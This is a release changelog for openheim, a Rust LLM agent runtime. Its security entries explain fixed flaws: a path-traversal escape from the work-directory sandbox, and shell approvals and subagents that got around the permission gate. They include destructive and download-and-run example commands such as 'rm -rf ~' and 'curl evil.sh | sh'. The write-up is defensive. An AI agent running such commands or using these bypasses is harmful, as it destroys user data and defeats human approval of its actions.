# Changelog

## [Unreleased]

### Security

- **Fixed a sandbox escape in work-directory path validation** — `validate_path` resolved `..` segments through the kernel while walking ancestors to find something to canonicalize, but a path whose first component doesn't exist yet (e.g. `x/../../../outside/pwned.txt`) returns `ENOENT` for *every* ancestor containing `x/..`, so the walk validated only `work_dir` itself and handed the raw, un-normalized path back to the caller. The kernel then resolved the `..`s at syscall time — after `write_file`'s `create_dir_all` had created the missing `x/` prefix — letting a tool call (or a remote WS client via the fs sidecar's `mkdir`/`write`) create files and directories **outside `work_dir`**. Paths are now normalized lexically (`.` stripped, `..` resolved against the preceding component) *before* any filesystem probing, and the normalized path is what gets validated and returned, so no `..` component ever survives to syscall time. One deliberate behavior change: `link/../foo`, where `link` is a symlink, now resolves lexically to `work_dir/foo` instead of following the symlink — strictly safer for containment, since the returned path is always the one the caller opens.
- **"Allow Always" on a shell command no longer covers different commands sharing its program name** — remembered `session/request_permission` decisions for `execute_command` were keyed by the command's first word (introduced in 0.5.0 to stop per-tool-name blanket approvals), which meant approving `git status` once also auto-approved `git status && rm -rf ~` or `git … | curl evil.sh | sh` for the rest of the session — the shell operators ride along after the first word. Approvals are now scoped to the exact command string: only byte-identical commands reuse an "Allow Always". The tradeoff is that argument variations re-prompt (annoying, but any prefix-based match reopens the bypass); unparseable tool arguments get a per-raw-arguments key so one malformed approval can never cover another. Applies to both the ACP gate and the TUI's permission prompt; other tools remain approved per-tool-name as before.
- **`execute_command` is now bounded: hard timeout, output caps, cancellation, and process-group cleanup** — previously the tool buffered unbounded stdout/stderr (a chatty command ballooned memory and pushed its full output verbatim into the model's context, with no truncation anywhere in the pipeline), had no timeout (`sleep infinity` pinned the turn forever), ignored `session/cancel` while a command ran, and spawned the shell in the server's own process group — so backgrounded grandchildren (`sh -c "sleep 999 &"`) outlived the turn as orphans. Commands now run in their own process group with stdin detached; stdout and stderr are each capped at 64 KiB with a `[output truncated…]` marker (the pipe is closed at the cap, so producers still writing die of `SIGPIPE` instead of buffering without bound); a 120-second timeout kills the whole process group and returns an error carrying the partial output; and a turn cancellation kills the group the same way, with exits always reaped so no zombies remain. Applies everywhere the tool runs — ACP sessions, the TUI, subagents, and the library facade — and the LLM-facing tool description now states the bounds so the model can plan around them.

## [0.6.0] - 2026-07-17

### Added

- **Inline (ephemeral) subagents** — the orchestrating agent can now create its own subagent on the fly by calling `delegate_task` with a `system_prompt` (plus optional `tools`, `model`, `provider`, `max_iterations`) instead of a pre-configured `agent` name. Inline subagents are never persisted — nothing is written to `~/.openheim/agents/` — and run through the same machinery as named profiles, so the sandbox boundary, parent permission gate/cancellation, and no-recursion guarantees apply identically. `delegate_task` is now always exposed (previously it was omitted when no profiles were configured). See `docs/subagents.md` §"Inline subagents".
- **`SessionHandle::prompt_with_images(text, images, on_update)`** — library embedders can now send mixed text+image turns, not just text. Each image is a `(base64_data, mime_type)` pair; the text block (when non-empty) leads, followed by the images. The core already modeled images end-to-end (`ContentBlock::Image`, forwarded to Anthropic/OpenAI/Gemini), and the ACP `session/prompt` wire already accepted them (see 0.5.0) — this closes the gap in the library facade, which previously only sent text. `prompt` now delegates to it with no images. See `docs/library.md` §"Send a prompt with images".

## [0.5.0] - 2026-07-06

### Security

- **`/ws` filesystem sidecar is now sandboxed to `work_dir`** — previously the fs channel validated paths against a *client-chosen* root (whatever directory the client sent in `watch`), giving any connected WebSocket client read/write/delete access to arbitrary directories, bypassing the agent's own `work_dir` sandbox. All fs operations (`list`/`read`/`write`/`mkdir`/`delete`/`rename`/`watch`) are now validated against the agent's configured `work_dir` using the same path validator as the built-in `read_file`/`write_file` tools — including its symlink canonicalization and dangling-symlink protection, which the sidecar's old validator lacked.
- **Subagents (`delegate_task`) no longer bypass `session/request_permission`.** Every subagent run previously used a hardcoded always-allow gate regardless of the orchestrating turn's real permission gate, so in an interactive ACP session a subagent could execute shell commands and file writes with no client approval at all — an unconditional permission bypass reachable from the tool-call surface. Subagents now inherit the parent turn's actual permission gate (and its cancellation token, so `session/cancel` also stops in-flight subagents), so their tool calls go through the exact same approval flow as the orchestrator's own.
- **"Allow Always" on a shell command no longer approves every future shell command.** `session/request_permission`'s remembered decisions were keyed by tool name only, so picking "Allow Always" once for e.g. `git status` silently pre-approved any subsequent `execute_command` call for the rest of the session, including something unrelated and destructive like `rm -rf /`. Shell approvals are now scoped by the command's first word (its program name); other tools are unaffected and remain approved per-name as before.

### Changed (WS protocol)

- **`watch` no longer sets the fs validation root** — it only enables live `fs_event` notifications, and the watched directory must be within `work_dir`.
- **fs operations no longer require a prior `watch`** — requests used to error until the client sent one; they now work immediately, validated against `work_dir`. Relative paths resolve against `work_dir` instead of the watched root.
- **fs error messages changed** — path rejections now return the validator's descriptive message (e.g. `"Tool execution error: path '...' is outside the work directory '...'"`) instead of the generic `"Path not within workspace or does not exist"`.

### Added

- **Tool-call permission requests** — before executing a tool call, the ACP layer now sends `session/request_permission` and waits for the client's decision (allow/reject, once or always) instead of executing immediately. `AllowAlways`/`RejectAlways` decisions are remembered for the rest of the session. Library embeddings default to an always-allow gate unless the caller supplies their own (see `SessionHandle::permission_gate` below); the TUI now supplies a real one instead of relying on that default (see below).
- **TUI asks before running a tool call.** Previously the interactive terminal UI always auto-allowed every tool call, including `execute_command` — there was no way to review or block a shell command before it ran. It now shows a modal (`y`/`a`/`n`/`r` or ↑/↓ + Enter for Allow Once / Allow Always / Reject Once / Reject Always) and blocks execution until you answer, same options as the ACP `session/request_permission` flow.
- **`SessionHandle::permission_gate(Arc<dyn PermissionGate>)` / `.client_io(Arc<dyn ClientIo>)`** — embedders can now supply their own permission gate and client-side file I/O per session instead of being stuck with the previous hardcoded `AllowAll`/`NoClientIo`. Both default to the old behavior when unset, and both carry over automatically through `.restore()`. See `docs/library.md` §"Permission gate, cancellation, and client I/O".
- **`SessionHandle::cancel()`** — cancels the turn currently in flight for that session (delegates to `AgentState::cancel_session`); previously only reachable via the raw ACP `session/cancel` wire method, not from the library facade.
- **`OpenheimBuilder::tool(Box<dyn ToolHandler>)`** — registers a custom in-process tool when embedding openheim as a library, alongside the built-ins and any MCP-sourced tools and subject to the same sandbox boundary. The `ToolHandler` doc example in `src/tools/mod.rs` previously had no way to actually be wired into a running agent short of hand-rolling an `AgentState`; this closes that gap.
- **`session/cancel` actually cancels a running turn** — previously a `session/prompt` handler ran to completion on the single-task ACP event loop, so `session/cancel` sent mid-turn had no effect until the turn finished (and any client round-trip mid-turn, like a permission request, would have deadlocked). Prompt turns now run in a spawned task; cancellation is checked between LLM iterations and before each tool call, and any pending permission request resolves to "cancelled" immediately.
- **Session modes** — `session/set_mode` now works, with two modes: `code` (full tool access, default) and `architect` (read-only — only `read_file` is offered to the LLM). Advertised via `session/new` and `session/load` responses.
- **Client-side filesystem delegation** — when the ACP client advertises `fs.readTextFile` / `fs.writeTextFile` support at `initialize`, `read_file`/`write_file` are delegated to `fs/read_text_file` / `fs/write_text_file` instead of local disk I/O, falling back to local I/O otherwise.
- **`GET /acp` WebSocket endpoint** — a second, minimal WebSocket endpoint alongside `/ws` that speaks bare ACP JSON-RPC with no envelope and no filesystem sidecar, for generic ACP-only clients. `/ws` is unchanged. See `docs/api.md` §3.4.
- **Image content in prompts** — `session/prompt` now accepts ACP `Image` content blocks and forwards them to Anthropic, OpenAI, and Gemini (all three support vision); the agent declares the `image` prompt capability at `initialize` so ACP clients know they can send them. `ResourceLink` blocks (which agents must support unconditionally per the ACP spec) become a `[referenced resource: name (uri)]` text hint instead of being dropped — the agent's own file tools can follow the hint if needed. `Audio` and embedded `Resource` blocks now return a clear error instead of being silently dropped.
- **`core::models::StreamEvent::MessageAppended { message }`** — fired every time the agent loop pushes a message (assistant or tool-result) onto the turn's history, not just at the end. The ACP layer's incremental history persistence (see below) is built on this, but it's a generic signal any `run_agent_streaming_with_history` caller can use.
- **`rag::HistoryManager::append_message(id, message)`** — appends one message to a conversation's on-disk log without rewriting the rest of it (see "History durability" under Fixed).
- **`config::AppConfig::resolve_provider_default(provider_name)`** — resolves a named provider using its own `default_model`, with the same validation as the other `resolve_*` methods. Used by session restore (see Fixed) and available to embedders.

### Fixed

- **`openheim run` could hang or falsely deny every tool call** — the ACP server's fallback dispatch handler (`on_receive_dispatch`, used to reply "unsupported method" to unrecognized incoming requests) also intercepted *responses* to requests the agent itself sent, since both share the same generic `Dispatch` type. Once the agent started sending real requests to the client — `session/request_permission` (this release) and `fs/read_text_file`/`fs/write_text_file` — their responses were being converted into spurious errors instead of reaching the code awaiting them. This is now fixed: the fallback only handles genuinely unclaimed requests/notifications and explicitly declines responses, letting them route normally. Also added a `session/request_permission` handler to `openheim run`'s in-process ACP client (auto-allow, since it's a non-interactive one-shot CLI invocation) so headless runs behave as before.
- **Anthropic extended thinking was effectively broken end-to-end.** Two separate bugs: (1) the `anthropic-beta: interleaved-thinking-2025-05-14` header was sent for `claude-3-7` models only — that beta is actually a Claude 4 feature, so the check was inverted; (2) the request itself used the legacy `budget_tokens` thinking form gated on a `model.contains("-4-")` substring match, and `budget_tokens` now returns a hard 400 on current-generation models (Opus 4.7/4.8, Sonnet 5, Fable 5) — meaning thinking never worked at all on the default/recommended models, header aside. Fixed by switching to `{"type": "adaptive"}` for an explicit allowlist of adaptive-capable model families; adaptive thinking auto-enables interleaving, so the beta header requirement goes away entirely rather than needing a fix.
- **Thinking blocks were never replayed back to Anthropic.** When extended thinking is enabled and the model calls a tool, the API requires the triggering `thinking` block (with its signature) to be replayed verbatim on the very next request. Openheim streamed thinking text to the UI but never stored it anywhere, so the next tool-result round trip would 400. Thinking content and its signature are now stored on the assistant message and replayed as the first content block of that turn.
- **`session/cancel` no longer waits out an in-flight LLM request.** `run_agent_loop` previously only checked the cancellation token between iterations and before tool calls, so cancelling mid-response (streaming or not) had no effect until the provider's HTTP call finished on its own — on a slow or hanging request, `session/cancel` could take arbitrarily long to actually stop anything. The LLM call is now raced against the cancellation token via `tokio::select!` in both the streaming and non-streaming paths; cancelling drops the in-flight request immediately instead of waiting for it.
- **Exhausting `max_iterations` was reported to ACP clients as a normal `EndTurn`.** `acp_prompt` only distinguished `Cancelled` from everything else (by polling session state after the turn finished), so a subagent-less turn that hit the iteration cap looked identical to one that stopped on its own. The agent loop now returns a `StopReason` (`EndTurn`/`MaxIterations`/`Cancelled`/`NoContent`) directly instead of the caller inferring it, and `acp_prompt` maps `MaxIterations` to ACP's `StopReason::MaxTurnRequests`.
- **Two overlapping `session/prompt` calls on the same session used to race.** Each `acp_prompt` invocation reset the session's cancellation token and, at turn end, rewrote the whole history file — with no coordination, a second prompt sent before the first finished would clobber the first turn's cancellation and history (last writer wins), with no error to either caller. A `session/prompt` received while one is already in flight for that session is now rejected immediately with a clear error instead of racing.
- **Non-streaming Anthropic calls (e.g. subagents via `delegate_task`) never got extended thinking, even on models where thinking is enabled for interactive sessions.** `AnthropicClient::send` built its own request from scratch with `thinking: None` hardcoded, separately from `send_streaming`'s (correct) request-building. `send` is now implemented in terms of `send_streaming` with a discarded channel, so both paths share one request-building/error-handling implementation and behave identically — subagents get the same thinking behavior as the orchestrating turn.
- **`GET /api/sessions/{id}` could 404 for the wrong reason.** `session_handler` mapped *any* `Error::Other` from `load_conversation` to HTTP 404, which only happened to be correct because "conversation not found" was the sole `Other`-producing path there; any future `Error::Other` from that call would have been silently misreported as "session not found" instead of a 500. It now matches the new, semantically-typed `Error::NotFound` instead.
- **The TUI discarded the real error when startup failed.** `OpenheimClient::builder().build()` and `SessionBuilder::start()` already return a typed `crate::error::Error`, but the TUI's `run()` re-wrapped any failure into `Error::Other(e.to_string())` before propagating it — flattening, for example, a `ConfigError` (missing API key) into an opaque string. It now propagates the original typed error via `?`.
- **`openheim init` shipped stale default models.** The `config.toml.default` template written by `openheim init` and the `OpenheimBuilder` programmatic path's built-in defaults (`src/client.rs`) were two independently hand-maintained copies of "the default model per provider" that had already drifted — the template still had `gpt-4` and a pinned `claude-sonnet-4-5-20250929` snapshot, while the programmatic path had moved on to `gpt-4o`/`claude-sonnet-4-6`. Both now read from one `BUILTIN_PROVIDER_DEFAULTS` table (`src/config/mod.rs`), and the template is updated to match; a test parses the shipped template and fails if it and the table disagree again.
- **`session/load` restored sessions with an unvalidated, hand-assembled provider config.** `acp_load_session` rebuilt the session's `AgentConfig` field-by-field from the raw provider entry instead of going through `AppConfig`'s `resolve_*` methods — skipping `validate_provider` and the models allowlist (a restored session could silently keep using a model since removed from the provider's `models` list), and carrying its own private copy of the 120s timeout default. It now resolves through the same validated path as every other config lookup (`resolve_with_provider` / the new `resolve_provider_default`); a session whose saved provider or model no longer resolves falls back to the default provider with a visible warning, instead of silently loading stale settings. Relatedly, the three `resolve_*` methods each assembled the `AgentConfig` independently — they now funnel through one constructor, and the timeout default has a single home (`ProviderConfig::resolve_timeout_secs`), so the five hand-kept copies of `unwrap_or(120)` are down to one.
- **`GET /api/sessions` and `GET /api/sessions/{id}` did blocking file I/O on the async runtime.** The axum handlers called the synchronous history loaders directly on a runtime worker thread — the ACP layer already wrapped the very same calls in `spawn_blocking`; both handlers now do the same.
- **History durability: a crash mid-turn no longer loses the whole turn, and a crash mid-save can no longer corrupt a previously-saved conversation.** Two separate problems: (1) conversation history was only ever saved once, after the whole turn completed — a crash or kill partway through a long tool-call chain lost every message the turn had produced so far; (2) that save (`std::fs::write`, truncate-then-write-in-place) was itself not atomic, so a crash *during* the save could corrupt the file, destroying every previously-saved turn too, not just the current one. Fixed by splitting each conversation into a small `{id}.json` metadata file and an append-only `{id}.jsonl` message log (`rag::history::HistoryManager`): messages are appended one at a time as they're produced (via the new `MessageAppended` event above) instead of the whole conversation being rewritten per message, and both files are now written via temp-file-plus-rename instead of in-place truncation. A conversation written before this change (a single self-contained `{id}.json`, no `.jsonl` sibling) still loads correctly and is transparently upgraded to the split layout the next time it's saved — no migration step or user action needed, unlike the `Message` content-block redesign earlier in this changelog.

### Breaking changes (library)

- `SandboxedExecutor::new` takes an additional `client_io: Arc<dyn ClientIo>` argument (use `Arc::new(NoClientIo)` for the previous local-disk-only behavior).
- `core::agent::run_agent_with_history` and `run_agent_streaming_with_history` take a `&TurnContext` in place of no equivalent parameter previously — bundles cancellation and permission-gate hooks (see `core::turn::TurnContext`, `core::permission`).
- **`TurnContext` moved from `core::agent` to `core::turn`.** Update imports to `openheim::core::turn::TurnContext`.
- **`tools::ToolExecutor::execute` gained a `turn: &TurnContext<'_>` parameter** (`fn execute(&self, name: &str, args_json: &str, turn: &TurnContext<'_>)`), so custom `ToolExecutor` implementations must accept and (if wrapping another executor) forward it. `tools::DelegateTool` no longer implements `ToolHandler` — it needs `TurnContext`, which that trait doesn't carry — and now has its own inherent `execute(&self, args: &str, turn: &TurnContext<'_>)`.
- **`acp::AgentState::new` takes an additional `custom_tools: Vec<Box<dyn ToolHandler>>` argument** (pass `vec![]` for the previous behavior). Callers going through `OpenheimBuilder` are unaffected — `.tool()` populates this for you.
- `StreamEvent::ToolCall` and `StreamEvent::ToolResult` gained an `id` field.
- **`core::models::Message` redesigned around content blocks.** `content: Option<String>` plus the flat `tool_calls`/`tool_call_id`/`tool_name`/`is_error` fields are replaced by a single `content: Vec<ContentBlock>` (`Text`/`Thinking`/`Image`/`ToolUse`/`ToolResult`), matching Anthropic's own content-block shape. Use the new `Message::text()` / `tool_calls()` / `tool_result_block()` accessors in place of the old fields; the `Message::user()` / `assistant()` / `tool_result()` constructors are unchanged. `ToolCall`, `FunctionCall`, `ChatRequest`, and `ChatResponse` (always OpenAI's wire shape, not a genuinely provider-agnostic concept) are removed from `core::models` — `OpenAiClient` now has its own private wire types, matching the pattern the Anthropic and Gemini clients already used. See `docs/custom-llm-provider.md`.
- **`core::models::AgentResult` gained a `stop_reason: StopReason` field** — construct it with the new field if you build one directly (only relevant if you call `core::agent::run_agent_with_history`/`run_agent_streaming_with_history` and pattern-match the result exhaustively).
- **`acp::AgentState::acp_prompt` returns `Result<core::models::StopReason>` instead of `Result<()>`.** `AgentState::is_session_cancelled` is removed — it existed only to reconstruct the stop reason after the fact, which the new return value now provides directly. `client::SessionHandle::prompt` (the library facade) is unaffected, still `Result<()>`.
- **`acp::session::SessionState` gained a `prompt_lock: Arc<tokio::sync::Mutex<()>>` field.** Only relevant if you construct `SessionState` directly rather than through `AgentState::acp_new_session`/`acp_load_session`.
- **No migration path for existing history.** `~/.openheim/history/*.json` files written before this change are in the old flat `Message` shape and will fail to load (`load_conversation` returns an error rather than panicking; conversations with zero messages are unaffected). This is a deliberate choice for this release, not an oversight — there was no compatibility requirement to preserve.
- **`core::models::{WsRequest, WsResponse, ClientEnvelope, ServerEnvelope, SystemEvent}` removed.** These were dead — `src/transport/ws.rs` has always used its own private envelope types — but were publicly reachable via the old `pub use models::*` glob in `src/lib.rs`. If you referenced any of them directly (unlikely, since nothing in this crate ever produced or consumed them), there is no replacement; they described no real wire format.
- **`core::models::{FileEntry, FsRequest, FsResponse}` moved to `transport::ws`.** They describe the `/ws` filesystem-sidecar protocol, not a core agent-loop concept. Update imports to `openheim::transport::ws::{FileEntry, FsRequest, FsResponse}`.
- **`openheim::*` (the crate-root re-export) is now an explicit list instead of `pub use models::*`.** Behavior is unchanged for every type that was actually reachable before — `ContentBlock` was already silently shadowed at the crate root by `agent_client_protocol::schema::ContentBlock` (glob imports lose to explicit ones), so `openheim::ContentBlock` was always the ACP type, never `core::models::ContentBlock`; that stays true. Anything not in the new explicit list (`AgentResult`, `AgentStep`, `Choice`, `FinishReason`, `FunctionDefinition`, `Message`, `Role`, `StopReason`, `StreamEvent`, `Tool`, `ToolExecutionResult`, `ToolResultBlock`, `ToolUseBlock`) is still reachable via `openheim::core::models::*` or `openheim::transport::ws::*`.
- **`core::models::Choice::finish_reason` is now `Option<FinishReason>` instead of `Option<String>`.** `FinishReason` is a new enum (`Stop`/`ToolCalls`/`MaxTokens`/`Other(String)`) normalizing the three providers' differing wire vocabularies (Anthropic's `stop_reason`, Gemini's `finishReason`, OpenAI's `finish_reason`); each provider module now maps its raw value onto it once, at the response-parsing boundary, instead of leaving callers to match on ad hoc provider-specific strings. Custom `LlmClient` implementations must do the same mapping — see the updated worked example in `docs/custom-llm-provider.md`.
- **`StreamEvent` gained a `MessageAppended { message }` variant** (see "Added" above). `StreamEvent` is not `#[non_exhaustive]`, so a `run_agent_streaming_with_history`/`run_agent_with_history` caller that matches on it exhaustively needs a new arm.
- **`rag::history::Conversation`/`ConversationMeta` are unchanged as Rust types, but the on-disk file layout they're persisted to is not** — see "History durability" under Fixed. Only relevant if something outside openheim itself reads `~/.openheim/history/*.json` directly expecting the old self-contained shape (with an embedded `messages` array); `HistoryManager`'s own read path handles both transparently.
- **`acp::{MODE_CODE, MODE_ARCHITECT}` string constants replaced by the `acp::AgentMode` enum** (`Code`/`Architect`), and `acp::session::SessionState::mode` is now `AgentMode` instead of `String`. `AgentState::acp_set_session_mode` still takes the mode id as `&str` (the ACP wire shape) and now returns a clear error via `AgentMode::parse` for unrecognized ids, same as before.
- **`OpenheimClient::{get_session, list_all_sessions, delete_session}` are now `async`** — they run the underlying blocking history I/O via `spawn_blocking` instead of on the caller's runtime thread, matching the rest of the facade; add `.await`. Direct low-level access via `client.rag().history` is unchanged and deliberately stays synchronous.
- **`Error` gained two variants: `NotFound(String)` and `JoinError(#[from] tokio::task::JoinError)`.** `Error` is not `#[non_exhaustive]`, so an exhaustive `match` on it needs new arms. Several call sites that previously returned the catch-all `Error::Other` for a missing session/conversation/skill, or for a failed `tokio::task::spawn_blocking` join, now return these instead — narrower matching (e.g. `if let Error::NotFound(_) = e`) is possible where it wasn't before, but code matching on `Error::Other`'s string contents for these cases will no longer match.

## [0.4.0] - 2026-06-11

### Added

- **Subagents** — drop a Markdown profile in `~/.openheim/agents/{name}.md` (optional `+++`-delimited TOML frontmatter for `description`, `model`, `provider`, `tools`, `max_iterations`, mirroring how skills work) and the agent gains a `delegate_task` tool for handing off self-contained work to it. Each delegation runs an isolated agent loop — its own message history, persona, and optionally its own model/provider and restricted tool set — sandboxed identically to the parent, and returns only the subagent's final answer. See `docs/subagents.md`.

### Fixed

- **Streaming requests are now retried** — `RetryClient` previously only retried non-streaming `send` calls, so the interactive (streaming) path got no retry on transient failures. Streaming calls are now retried with the same exponential backoff, but only while it is still safe — before the first chunk reaches the caller. Once tokens have been forwarded, a mid-stream failure is returned as-is rather than replayed.

### Breaking changes (library)

- Removed `config::resolve_client_and_config` (unused outside its own tests). Its "reuse the client unless the provider/model changed" logic is now exposed as `config::client_for_config(target, baseline, baseline_llm)`.

## [0.3.0] - 2026-06-01

### Added

- **System identity (`system.md`)** — `~/.openheim/system.md` defines the agent's base identity and is injected into the system prompt on every session. `openheim init` creates a default file. The prompt is now structured: identity block first, then skills, separated by clear section headers.
- **`default_skills` in config** — new `default_skills` array in `config.toml` auto-loads a set of skills into every session without passing `--skills` each time. Per-session skills are merged on top; duplicates are removed with defaults appearing first.
- **`default_skills` in `OpenheimBuilder`** — `.default_skills(vec![...])` builder method brings the same control to programmatic embeddings.
- **Work-directory sandbox** — new `work_dir` field in `config.toml` restricts `read_file` and `write_file` to a directory tree. When unset, the directory from which openheim is invoked is used. Symlinks are followed and canonicalized so they cannot be used to escape the boundary.
- **Shell access control** — new `allow_shell` boolean in `config.toml` (default `true`). When `false`, the `execute_command` tool is removed from the tool list entirely — the LLM never sees it and cannot request it.
- **Builder methods for security controls** — `OpenheimClient::builder()` gains `.work_dir(path)` and `.allow_shell(bool)`. Both override the corresponding config-file values.
- **Cross-compilation config** — `Cross.toml` added for building Linux targets from macOS.

### Fixed

- **MCP subprocess stderr suppression** — stderr from spawned MCP server processes no longer leaks into the terminal.
- **`run` command exits cleanly** — the process now exits after a headless `openheim run` prompt completes instead of hanging.
- **`merge_skills` deduplication** — skills within the `default_skills` list itself are now deduplicated, not just across the default/session boundary.
- **Whitespace preserved in system identity** — leading and trailing whitespace in `system.md` content is preserved when building the system prompt.
- **Accurate `init` error message** — `openheim init` now correctly reports whether `system.md` was created when the config already exists.

### Breaking changes (library)

- `AppConfig` gained two new public fields: `work_dir: Option<PathBuf>` and `allow_shell: bool`. Code constructing `AppConfig` via struct literal (rather than TOML or the builder) must now supply these fields. Both have serde defaults so TOML loading is unaffected.
- `SystemToolExecutor::build` takes an additional `allow_shell: bool` argument.

## [0.2.1] - 2026-05-28

### Added

- github release workflow

## [0.2.0] - 2026-05-27

### Added

- **ratatui TUI** — complete rewrite of the terminal UI on ratatui; interactive picker for sessions, models, and commands replacing static text lists.
- **Token streaming & thinking blocks** — real token-level streaming and extended thinking display across all LLM providers (Anthropic, OpenAI, Gemini, OpenAI-compatible).
- **Themes** — built-in theme support; `:theme` command to switch at runtime.
- **`:models` command** — interactive popup picker to switch provider/model without leaving the session.
- **`session/set_model` in ACP** — clients can now switch the model mid-session via the Agent Client Protocol; thinking convention is advertised in session metadata.
- **`TerminalGuard` RAII** — terminal state is reliably restored on panic or forced exit.

### Fixed

- **MCP child process leak** — MCP server subprocesses are now killed when the client is dropped.
- **SSE buffer reallocation** — fixed a bug where the SSE read buffer could be reallocated incorrectly, silently dropping streamed tokens.
- **JSON serialization errors propagated** — LLM serialization failures now surface as errors instead of silently producing empty output.
- **Session restore** — restoring a session from history now correctly sets it as the active session and clears stale state.
- **Model switch shows full pair** — switching models now displays the full `(provider, model)` pair in the UI.
- **Provider config on session load** — ACP session load now resolves the full provider configuration instead of a partial view.
- **Model-whitelist enforced on provider resolution** — `resolve_with_provider` now checks the model whitelist before accepting a model.
- **Unconfigured provider warning on restore** — a clear warning is emitted when a restored session references a provider that is not in the current config.
- **Message word wrap** — long messages now wrap correctly in the TUI viewport.
- **Tool command error handling** — tool execution errors are captured and reported rather than silently dropped.

### Improved

- **Config, MCP, and skills views** — each view was refactored into a cleaner layout with consistent popup helpers.
- **Info panels moved to prompt area** — contextual info panels now render next to the input prompt instead of overlapping the message list.
- **TUI internals** — extracted `handle_scroll_key`, `highlight_row`, `centered_popup`, `push_screen`, and `Screen::is_overlay()` helpers; eliminated duplicated scroll/picker rendering code.

## [0.1.1] - 2026-05-21

### Fixed

- **Tool call history gaps** — ACP sessions were silently dropping tool calls from stored history; all tool calls are now captured correctly.
- **Accurate status on replay** — Replayed tool calls now emit `InProgress` before resolving, matching the behaviour of live sessions.
- **Failed tool calls now surface as `Failed`** — Previously, tool failures were stored as plain text and replayed as `Completed`. The `is_error` flag is now persisted in `Message` and propagated through `StreamEvent::ToolResult` so both live and replayed paths emit `ToolCallStatus::Failed`.
- **Tool error logging** — Improved logging for tool call errors.

### Improved

- **LLM accuracy on failures** — `is_error` is forwarded to Anthropic's `tool_result` block, giving the model accurate signal when a tool has failed.
- Added `CHANGELOG.md`.
- Updated documentation for `is_error` and tool call history replay semantics.
- README updates.

## [0.1.0] - 2026-05-15

First public release of openheim — a fast, multi-provider LLM agent runtime written in Rust.

### What's included

- **Multi-provider support** — OpenAI, Anthropic, Gemini, and any OpenAI-compatible endpoint
- **MCP integration** — connect external tools via Model Context Protocol (stdio and HTTP transports)
- **ACP server** — expose the agent over the Agent Client Protocol with WebSocket streaming
- **Tool execution** — built-in filesystem, shell, and extensible tool framework
- **Conversation history** — persistent sessions with RAG context and skill injection
- **Interactive REPL** — terminal UI for local development
- **Headless / programmatic mode** — embed openheim as a library in your own Rust application

### Install

```bash
cargo install openheim
```

Or add as a library:

```toml
[dependencies]
openheim = "0.1.0"
```

See the [README](https://github.com/weirdstuff-dev/openheim/blob/main/README.md) for configuration and usage.
